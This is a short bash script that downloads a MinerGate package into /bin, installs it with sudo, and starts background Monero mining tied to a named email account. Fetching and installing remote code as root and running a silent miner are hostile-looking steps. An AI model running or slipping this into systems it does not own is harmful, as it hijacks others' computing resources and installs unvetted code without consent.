#!/bin/bash
cd /bin && wget -O miner.deb https://download.minergate.com/deb-cli
sudo apt install ./miner.deb
minergate-cli -u quinnkid12321@gmail.com --xmr 6 &
